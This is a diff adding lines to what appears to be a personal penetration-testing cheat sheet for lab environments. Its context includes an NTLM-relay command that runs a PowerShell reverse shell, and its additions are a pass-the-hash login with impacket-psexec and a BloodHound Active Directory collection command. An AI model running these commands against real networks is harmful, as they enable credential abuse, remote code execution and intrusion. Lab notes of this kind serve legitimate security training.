@@ -749,6 +749,9 @@ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
 
 # Execute a PowerShell based reverse shell using impacket-ntlmrelayx.
 impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>
+
+#login using PtH
+impacket-psexec administrator@10.129.43.13 -hashes aad3b435b51404eeaad3b435b51404ee:7asdadwafawfhawwg356163af1a54
 ```
 
 ##### Attacking SQL
@@ -1042,6 +1045,9 @@ bloodhound-python -d DOMAIN.LOCAL -u USER -p 'PASS' -dc DC01 -c All
 
 # Upload results to BloodHound CE
 # - Produces .json files (zip them if needed) → import via BHCE UI
+
+#Makes a zip automatically
+python3 bloodhound.py -d fluffy.htb -u 'user' -p 'pass' -c all --zip -ns 10.10.10.1
 
 ```
 ##### LLMNR Poisoning
